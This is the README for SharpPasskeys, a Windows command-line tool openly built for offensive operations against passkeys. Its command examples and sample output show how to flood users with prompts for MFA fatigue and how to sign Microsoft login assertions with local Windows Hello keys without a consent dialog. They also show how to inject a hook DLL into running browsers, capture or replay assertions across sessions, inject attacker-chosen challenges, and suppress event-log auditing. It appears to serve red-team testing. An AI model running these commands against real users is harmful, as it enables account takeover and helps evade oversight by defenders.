# SharpPasskeys

## Overview

.NET CLI tool that wraps the Windows WebAuthn API (`webauthn.dll`) and the WebAuthn hook DLL for offensive operations against passkeys:

- `prompt` — Trigger a passkey assertion (Windows Hello, security key, or hybrid device) via [WebAuthNAuthenticatorGetAssertion](https://learn.microsoft.com/en-us/windows/win32/api/webauthn/nf-webauthn-webauthnauthenticatorgetassertion)
- `whfb` — Sign a `login.microsoft.com` assertion directly with a local Windows Hello for Business (NGC) key, without opening a WebAuthn prompt
- `wait` — Block until the Windows WebAuthn event log records an assertion request (event ID 1103) and optionally kill `CredentialUIBroker.exe`
- `list` — Enumerate platform authenticators, third-party authenticator plugins, Windows Hello credentials, recent WebAuthn event-log activity, and process window handles
- `hook` — Load or unload the [WebAuthn hook DLL](WebAuthnHook.md) into running browser processes and listen on the hook control pipe (`\\.\pipe\WebAuthnHook`)
- `apiversion` — Report the WebAuthn API version and whether a user-verifying platform authenticator (e.g., Windows Hello) is available

The tool is a .NET Framework 4.8 console application designed to run on a target host directly, via a Windows C2 agent such as [Apollo](https://docs.specterops.io/mythic-agents/apollo-docs/documentation-payload/apollo) (Mythic), or chained with the bundled native [WebAuthn hook](WebAuthnHook.md).

## Building from source

```powershell
# Build the CLI (Debug) — run from the repo root
dotnet build Src\SpecterOps.Passkeys.SharpPasskeys

# Release build — produces a single merged assembly via dnMerge
dotnet build Src\SpecterOps.Passkeys.SharpPasskeys -c Release
```

The output is `SharpPasskeys.exe`. When the native [WebAuthn hook](WebAuthnHook.md) project has also been built, the architecture-specific `WebAuthnHook_x64.dll` / `WebAuthnHook_x86.dll` / `WebAuthnHook_arm64.dll` are copied next to the CLI automatically so `hook attach` can find them.

## Usage

```text
SharpPasskeys.exe <command> [subcommand] [--option value ...]
```

Run `SharpPasskeys.exe --help` or `SharpPasskeys.exe <command> --help` for the built-in help text.

## prompt command

Triggers a passkey assertion via [WebAuthNAuthenticatorGetAssertion](https://learn.microsoft.com/en-us/windows/win32/api/webauthn/nf-webauthn-webauthnauthenticatorgetassertion). Any registered authenticator may be used — Windows Hello, an external security key, or a hybrid device.

### Options

| Option | Description |
|---|---|
| `--relying-party`, `-r <id>` | **Required.** Relying Party ID (e.g. `login.microsoft.com`). |
| `--challenge`, `-c <b64url>` | **Required.** Challenge bytes encoded as base64url. Embedded into `clientDataJSON` as the `challenge` field. |
| `--credential-id`, `-i <b64url>` | Pre-select a specific credential (base64url-encoded credential ID). Without it, Windows lets the user pick among matching credentials. |
| `--hwnd <n>` | Parent HWND for the UI.<br>**Absent** → [GetConsoleWindow](https://learn.microsoft.com/en-us/windows/console/getconsolewindow).<br>**`0`** → auto-detect the main window of `chrome` / `msedge` / `firefox` / `outlook`, falling back to [GetForegroundWindow](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getforegroundwindow).<br>**Other** → cast as `HWND` (decimal). |
| `--authenticator`, `-a <v>` | Authenticator type hint. Populates the WebAuthn [`hints`](https://www.w3.org/TR/webauthn-3/#enum-hints) array and sets the legacy `dwAuthenticatorAttachment` field accordingly:<br>**`SecurityKey`** → removable authenticator (e.g., YubiKey, Feitian).<br>**`ClientDevice`** → built-in platform authenticator on the local device (e.g., Windows Hello, TPM-backed key).<br>**`Hybrid`** → cross-device authenticator paired over BLE / QR (e.g., a phone acting as an authenticator). |
| `--kill`, `-k` | Kill `CredentialUIBroker.exe` (double-tap) before prompting so the next call spawns a fresh broker. Useful when an existing UI is stuck or being suppressed. |
| `--flood`, `-f` | Repeat until the user accepts the prompt, capped by a 5-minute total wall-clock budget. Stops on success or budget exhaustion. `RPC_E_ACCESS_DENIED` (`0x8001011B`) triggers a 2-second back-off before retrying — this typically means another application is currently showing a WebAuthn prompt. Useful for MFA-fatigue testing. |
| `--private`, `-p` | Browser is in private mode. Skip event log entries. (OPSEC) |

### Example

```powershell
SharpPasskeys.exe prompt --relying-party login.microsoft.com --challenge dGVzdC1jaGFsbGVuZ2U
```

### Output

```text
12:34:56 info: Passkeys[0] Prompting for credentials with relying party 'login.microsoft.com' and authenticator hint 'Any'...
{"id":"mj9k...Zg","rawId":"mj9k...Zg","type":"public-key","response":{"authenticatorData":"...","clientDataJSON":"...","signature":"...","userHandle":"TywB...A"},"clientExtensionResults":{}}
```

### More examples

```powershell
# Pin to a specific credential, parent the prompt to a browser window (auto-detected), suppress audit log
SharpPasskeys.exe prompt -r contoso.com -c dGVzdA -i mj9k...Zg --hwnd 0 --private

# MFA-fatigue flood with hybrid hint
SharpPasskeys.exe prompt -r contoso.com -c dGVzdA --flood --authenticator Hybrid

# Spoof the parent window of an existing browser (see `list hwnd` for picking a handle)
SharpPasskeys.exe prompt -r github.com -c HvxwEkeqxPh-fB_c-wqXvfXiFXiamcEGluyRXSo2XxY --hwnd 2432736
```

## whfb command

Signs a WebAuthn assertion for `login.microsoft.com` with a locally available Windows Hello for Business key via `WindowsHelloForBusinessSigner`. Unlike `prompt`, this does not call `WebAuthNAuthenticatorGetAssertion` and does not display an authenticator selection or consent dialog. The local Windows Hello for Business key is expected to already be unlocked.

The Passkey Injector C2 command dialog adds `whfb` variants to the standalone, Mythic Apollo, and BOF lists
only when the intercepted assertion uses the `login.microsoft.com` relying party.

### Options

| Option | Description |
|---|---|
| `--challenge`, `-c <b64url>` | **Required.** Challenge bytes encoded as base64url. |
| `--signature-counter`, `--counter`, `-s <n>` | Signature counter value to embed in authenticator data. Default `0`. |
| `--private`, `-p` | Browser is in private mode while the command enumerates registered platform credentials. Skip event log entries. (OPSEC) |

### Example

```powershell
SharpPasskeys.exe whfb --challenge dGVzdC1jaGFsbGVuZ2U
```

### Output

```text
12:34:56 info: Passkeys[0] Signing challenge for relying party 'login.microsoft.com' with local Windows Hello for Business keys...
{"id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","rawId":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","type":"public-key","response":{"authenticatorData":"...","clientDataJSON":"...","signature":"...","userHandle":"..."},"clientExtensionResults":{}}
12:34:56 info: Passkeys[0] Generated 1 Windows Hello for Business assertion(s).
```

### More examples

```powershell
# Suppress the platform credential enumeration event log entry
SharpPasskeys.exe whfb -c dGVzdA --private
```

## wait command

Subscribes to the `Microsoft-Windows-WebAuthN/Operational` event log via [EventLogWatcher](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.eventing.reader.eventlogwatcher) and blocks until event ID 1103 (`WebAuthNAuthenticatorGetAssertion` request) is recorded. When the event arrives, the timestamp, Windows user, and relying party ID are printed and — optionally — `CredentialUIBroker.exe` is terminated to interrupt the in-flight prompt.

### Options

| Option | Description |
|---|---|
| `--timeout`, `-t <sec>` | Maximum time to wait for an assertion request. Default `600` (10 min). |
| `--kill`, `-k` | Kill `CredentialUIBroker.exe` (double-tap) when an assertion request is detected. |

### Example

```powershell
SharpPasskeys.exe wait --timeout 300 --kill
```

### Output

```text
12:34:56 info: Passkeys[0] Waiting for WebAuthn assertion request (timeout: 5m)...
12:35:42 info: Passkeys[0] Killed CredentialUIBroker (PID 7480).
Time: 2026-05-30 12:35:42
User: CONTOSO\alice
Relying Party: login.microsoft.com
```

## list command

Container command for read-only enumeration. Subcommands: `all`, `authenticators`, `plugins`, `hello`, `events`, `hwnd`.

### list all

Runs `authenticators`, `plugins`, `hello`, and `events` in sequence and prints each result table.

#### Options

| Option | Description |
|---|---|
| `--private`, `-p` | Forwarded to `list hello` to suppress the WebAuthn audit log entry. (OPSEC) |

#### Example

```powershell
SharpPasskeys.exe list all --private
```

### list authenticators

Enumerates platform authenticators registered with the Windows WebAuthn API (e.g., TPM, Windows Hello) via [WebAuthNGetAuthenticatorList](https://learn.microsoft.com/en-us/windows/win32/api/webauthn/nf-webauthn-webauthngetauthenticatorlist). Takes no options.

#### Example

```powershell
SharpPasskeys.exe list authenticators
```

#### Output

```text
+--------------------------------------+---------------+--------+
| AAGUID                               | Name          | Locked |
+--------------------------------------+---------------+--------+
| 08987058-cadc-4b81-b6e1-30de50dcbe96 | Windows Hello | No     |
+--------------------------------------+---------------+--------+
```

### list plugins

Enumerates third-party passkey provider plugins (1Password, Bitwarden, …) registered in the Windows registry. Takes no options.

#### Example

```powershell
SharpPasskeys.exe list plugins
```

#### Output

```text
+----------------+----------------+-------+-----------+
| Name           | Publisher      | User  | Algorithm |
+----------------+----------------+-------+-----------+
| 1Password      | AgileBits Inc. | Steve | ES256     |
| Bitwarden      | Bitwarden Inc. | John  | ES256     |
+----------------+----------------+-------+-----------+
```

### list hello

Lists discoverable (resident) credentials stored by Windows Hello for all relying parties via [WebAuthNGetPlatformCredentialList](https://learn.microsoft.com/en-us/windows/win32/api/webauthn/nf-webauthn-webauthngetplatformcredentiallist).

#### Options

| Option | Description |
|---|---|
| `--private`, `-p` | Browser is in private mode. Skip event log entries. (OPSEC) |

#### Example

```powershell
SharpPasskeys.exe list hello --private
```

#### Output

```text
+---------------------+---------------------+---------------------------------------------+
| Relying Party       | User                | Credential ID                               |
+---------------------+---------------------+---------------------------------------------+
| github.com          | satyanadella        | kGExWOTJk3CV-igJrwoDrupadlREaz5hgV7LlucUDho |
| login.microsoft.com | satya@microsoft.com | 5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM |
| x.com               | satyanadella        | SZON8oxKsECzhzIwG3LIXG_YX1mwFE2U_kJcfaM43Vc |
+---------------------+---------------------+---------------------------------------------+
```

> ![NOTE]
> The WebAuthn API does **not** return private keys — only credential metadata and the resulting assertion signature.
> Private keys are protected by the platform authenticator (TPM-backed or VBS-backed where available).

### list events

Reads the `Microsoft-Windows-WebAuthN/Operational` event log, aggregates registration and authentication operations, deduplicates by relying party and credential ID, and prints a summary with last-used timestamp, use count, user, and authenticator manufacturer/model. Takes no options.

#### Example

```powershell
SharpPasskeys.exe list events
```

#### Output

```text
+---------------------+-----------+---------------------+---------------------+---------------------------------------------+------------------+
| Last Used           | Use Count | Relying Party       | User                | Credential ID                               | Authenticator    |
+---------------------+-----------+---------------------+---------------------+---------------------------------------------+------------------+
| 2026-05-30 11:42:18 |        12 | login.microsoft.com | satya@microsoft.com | 5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM | Windows Hello    |
| 2026-05-29 09:08:51 |         3 | github.com          | satyanadella        | kGExWOTJk3CV-igJrwoDrupadlREaz5hgV7LlucUDho | Yubico YubiKey 5 |
+---------------------+-----------+---------------------+---------------------+---------------------------------------------+------------------+
```

### list hwnd

Enumerates processes in the current session that own a visible main window. Useful for picking a window handle to pass to `prompt --hwnd <n>`. Takes no options.

#### Example

```powershell
SharpPasskeys.exe list hwnd
```

#### Output

```text
+------------------+------------+---------------------------------------------------------------+
| Process Name     | Handle     | Window Title                                                  |
+------------------+------------+---------------------------------------------------------------+
| msedge           |    2432736 | Microsoft - AI, Cloud, Productivity, Computing, Gaming & Apps |
| olk              |     132206 | Mail - John Doe - Outlook                                     |
| POWERPNT         |   28185102 | Pass-the-Passkey.pptx - PowerPoint                            |
| WindowsTerminal  |   12587510 | Administrator: Command Prompt                                 |
+------------------+------------+---------------------------------------------------------------+
```

## hook command

Manages the native [WebAuthn hook DLL](WebAuthnHook.md) inside running browser processes and hosts the control named pipe. The default browser list is `msedge`, `chrome`, `firefox`, `brave`, `opera`, and `vivaldi`. For each browser name the resolver prefers processes that own a visible top-level window, then those that have already loaded `webauthn.dll`, then every instance. Subcommands: `attach`, `detach`, `list`, `wait`.

The hook operations need the standard remote-thread / virtual-memory rights (`PROCESS_CREATE_THREAD`, `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, `PROCESS_VM_READ`). Targeting another user's browser requires `SeDebugPrivilege`.

### hook attach

Injects the architecture-matching `WebAuthnHook_*.dll` into the target process via `CreateRemoteThread` + `LoadLibraryW`. The injector detects target architecture with `IsWow64Process2` and picks the matching DLL unless `--dll` is supplied.

#### Options

| Option | Description |
|---|---|
| `--pid`, `-p <n>` | Target a single process ID. Mutually exclusive with `--process-name`. |
| `--process-name`, `--name`, `-n <name>` | Browser process name (without `.exe`). Defaults to the full known-browser list. |
| `--dll <path>` | Explicit path to the hook DLL. Defaults to the architecture-matching `WebAuthnHook_*.dll` next to the CLI. |

#### Example

```powershell
# Inject the hook into every running Edge / Chrome / Firefox / … instance
SharpPasskeys.exe hook attach

# Inject into a specific PID using an explicit DLL path
SharpPasskeys.exe hook attach --pid 1234 --dll C:\Tools\WebAuthnHook_x64.dll
```

#### Output

```text
12:34:56 info: Passkeys[0] Injected WebAuthnHook_x64.dll into msedge (pid 11804).
```

### hook detach

Removes the hook with iterated remote `FreeLibrary` calls. The hook installs multiple detours (`WebAuthNAuthenticatorGetAssertion`, `LoadLibraryW`, `LoadLibraryExW`), so the library is referenced more than once; `detach` retries up to eight times until the module is fully unloaded.

#### Options

| Option | Description |
|---|---|
| `--pid`, `-p <n>` | Target a single process ID. Mutually exclusive with `--process-name`. |
| `--process-name`, `--name`, `-n <name>` | Browser process name (without `.exe`). Defaults to the full known-browser list. |

#### Example

```powershell
# Unload the hook from every targeted browser
SharpPasskeys.exe hook detach

# Unload from a single PID
SharpPasskeys.exe hook detach --pid 11804
```

#### Output

```text
12:34:56 info: Passkeys[0] Unloaded hook from msedge (pid 11804).
```

### hook list command

Enumerates known browser processes and prints whether `webauthn.dll` and the hook DLL are loaded in each. Per browser, narrows the list to processes that own a visible window, else processes that already loaded `webauthn.dll`, else every instance. Takes no options.

#### Example

```powershell
SharpPasskeys.exe hook list
```

#### Output

```text
+-------+--------+------------+-----------------+-------------+
| PID   | Name   | Has Window | WebAuthn Loaded | Hook Loaded |
+-------+--------+------------+-----------------+-------------+
|  4128 | chrome | Yes        | Yes             | Yes         |
| 11804 | msedge | Yes        | No              | No          |
+-------+--------+------------+-----------------+-------------+
```

### hook wait

Creates the hook named pipe and reacts to assertion-ceremony messages from the hook DLL. The four actions returned to the hook (`continue`, `capture`, `inject`, `wait`) and the JSON pipe schema are documented in the [WebAuthn Hook README](WebAuthnHook.md#named-pipe).

#### Options

| Option | Description |
|---|---|
| `--rpid`, `--relying-party`, `-r <id>` | Relying party ID to match before taking action. |
| `--challenge`, `-c <b64url>` | Base64url-encoded challenge to inject when the relying party ID matches. Implies a 10-minute wait timeout. |
| `--cross-session`, `--capture` | Capture a matching assertion for cross-session use instead of letting the browser receive it. Mutually exclusive with `--challenge`. |
| `--monitor`, `-m` | Passive mode: log every hook message and always reply with `continue` so the browser flow is undisturbed. |
| `--named-pipe`, `--pipe`, `-p <name>` | Override the default pipe name (`WebAuthnHook`). Accepts either a bare name or a `\\.\pipe\…` path. |

#### Example

```powershell
# Passively observe assertion ceremonies; never alter the browser flow
SharpPasskeys.exe hook wait --monitor

# Capture the next assertion to login.microsoft.com for cross-session replay
SharpPasskeys.exe hook wait --rpid login.microsoft.com --capture

# Inject an attacker-controlled challenge into the next github.com ceremony
SharpPasskeys.exe hook wait --rpid github.com --challenge HvxwEkeqxPh-fB_c-wqXvfXiFXiamcEGluyRXSo2XxY
```

#### Output

```text
12:34:56 info: Passkeys[0] Listening on \\.\pipe\WebAuthnHook for hook assertion responses (timeout: 600s)...
12:35:02 info: Passkeys[0] Assertion ceremony started: rpId=login.microsoft.com previousAction=(none) process=msedge (pid 11804) user=CONTOSO\alice at 5/30/2026 12:35:02 PM.
12:35:02 info: Passkeys[0] Sending hook action Capture to pipe client.
12:35:08 info: Passkeys[0] Assertion ceremony completed: rpId=login.microsoft.com process=msedge (pid 11804) user=CONTOSO\alice previousAction=Capture at 5/30/2026 12:35:08 PM.
{"id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","rawId":"…","type":"public-key","response":{"authenticatorData":"…","clientDataJSON":"…","signature":"…","userHandle":"…"},"clientExtensionResults":{}}
```

## apiversion command

Reports the version of the Windows WebAuthn API available on the host and whether a user-verifying platform authenticator (e.g., Windows Hello) is provisioned. Takes no options.
The command requires Windows 10 1903+ with the WebAuthn platform API (`webauthn.dll`).

### Example

```powershell
SharpPasskeys.exe apiversion
```

### Output

```text
+---------------------------------+-------+
| Property                        | Value |
+---------------------------------+-------+
| API Version                     | 7     |
| Platform Authenticator Available| Yes   |
+---------------------------------+-------+
```

## Notes

The CLI uses [System.CommandLine](https://learn.microsoft.com/en-us/dotnet/standard/commandline/) and [DSInternals.Win32.WebAuthn](https://www.nuget.org/packages/DSInternals.Win32.WebAuthn) 3.3.0, including its `WindowsHelloForBusinessSigner` helper. Release builds are merged into a single assembly with [dnMerge](https://github.com/CCob/dnMerge).
